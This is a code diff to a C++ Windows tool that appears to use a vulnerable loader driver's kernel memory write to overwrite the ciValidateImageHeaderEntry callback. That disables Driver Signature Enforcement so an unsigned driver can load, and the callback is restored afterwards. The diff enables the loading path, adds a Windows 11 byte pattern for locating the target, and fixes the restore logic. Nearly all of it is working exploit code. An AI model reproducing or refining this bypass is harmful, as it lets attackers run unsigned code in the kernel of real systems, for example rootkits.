@@ -36,7 +36,6 @@ NTSTATUS vuln::driver_init( PWCHAR LoaderName, PWCHAR DriverName)
 	if ( !NT_SUCCESS( stat ) ) return stat;
 
 	stat = RtlGetFullPathName_UEx( DriverName, MAX_PATH * sizeof( WCHAR ), DriverPath, nullptr, nullptr );
-	std::printf( "Path %w", DriverName );
 	if ( !NT_SUCCESS( stat ) ) return stat;
 
 	stat = helpers::CreateDriverService( LoaderServiceName, LoaderPath );
@@ -47,7 +46,7 @@ NTSTATUS vuln::driver_init( PWCHAR LoaderName, PWCHAR DriverName)
 
 	std::wprintf( L"[+] Calling with:\n    Loader: %ls\n    Target: %ls\n", LoaderServiceName, DriverServiceName );
 	wprintf( L"\n" );
-		vuln::drv_call( LoaderServiceName, DriverServiceName, 0 );
+		vuln::drv_call( LoaderServiceName, DriverServiceName, 1 );
 
 	return stat;
 }
@@ -67,7 +66,12 @@ NTSTATUS vuln::driver_init( PWCHAR LoaderName, PWCHAR DriverName)
 * DriverServiceName: Name of your DriverServiceName Name
 * Should_load:		 dbg param (ignore)
 * 
+* Pattern (Win11 2H24): 
+*       mov r8d, 5               (opcode + immediate dword 5)
+*       lea r9, [rip + offset]   (RIP-relative addressing with 4-byte offset placeholder)
+*       mov [rsp+0x20], rax      (store rax at rsp+0x20)
 */
+
 NTSTATUS vuln::drv_call( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL should_load ) {
 	if ( !should_load )
 		wprintf( L"[!] DEBUG -> No Loading Selected : %d\n", should_load ); // Purely dbg
@@ -75,7 +79,7 @@ NTSTATUS vuln::drv_call( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL 
 		wprintf( L"[!] DEBUG -> Loading Selected : %d\n", should_load );
 
 	NTSTATUS stat = helpers::EnsureDeviceHandle( &helpers::dev, LoaderServiceName );
-	if ( !NT_SUCCESS( stat ) ) return{ STATUS_INVALID_HANDLE };
+		if ( !NT_SUCCESS( stat ) ) return{ STATUS_INVALID_HANDLE };
 
 	auto ci = modules::get_CIValidate_ImageHeaderEntry();
 
@@ -85,27 +89,23 @@ NTSTATUS vuln::drv_call( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL 
 	DWORD64 originalCallback{};
 
 	stat = helpers::read_64( ci.ciValidateImageHeaderEntry, originalCallback );
-	if ( !NT_SUCCESS( stat ) ) goto cleanup;
+		if ( !NT_SUCCESS( stat ) ) goto cleanup;
 
 	wprintf( L"[*] Original Callback : %p\n", originalCallback );
 
 	if ( should_load ) {
 		wprintf( L"[*] Flushing ciValidateImageHeaderEntry: %p -> %p\n", ci.ciValidateImageHeaderEntry, ci.zwFlushInstructionCache );
-		stat = test::WriteMemoryDWORD64( helpers::dev, ci.ciValidateImageHeaderEntry, ci.zwFlushInstructionCache );
-		if ( !NT_SUCCESS( stat ) ) goto cleanup;
+		stat = helpers::write_64( ci.ciValidateImageHeaderEntry, ci.zwFlushInstructionCache );
+			if ( !NT_SUCCESS( stat ) ) goto cleanup;
 
 		wprintf( L"[*] Attempting to load unsigned driver...\n" );
 		stat = helpers::LoadDriver( DriverServiceName ); // ciValidateImageHeaderEntry structure waiting on cache reset -> DSE enforcment flags ignored, load driver
-		if ( !NT_SUCCESS( stat ) ) {
-			printf( "[-] Operation failed: NTSTATUS = 0x%08X\n", stat );
-		}
 		
-		goto cleanup;
-
 		if ( ci.ciValidateImageHeaderEntry != originalCallback )
-			stat = test::WriteMemoryDWORD64( helpers::dev, ci.ciValidateImageHeaderEntry, originalCallback );
+			stat = helpers::write_64( ci.ciValidateImageHeaderEntry, originalCallback );
 
-		wprintf( L"[*] ciValidateImageHeaderEntry (%p) restored...\n", ci.ciValidateImageHeaderEntry );
+		if ( NT_SUCCESS( stat ) ) wprintf( L"[*] ciValidateImageHeaderEntry (%p) restored...\n", ci.ciValidateImageHeaderEntry );
+
 	}
 cleanup:
 	if ( helpers::dev ) NtClose( helpers::dev );
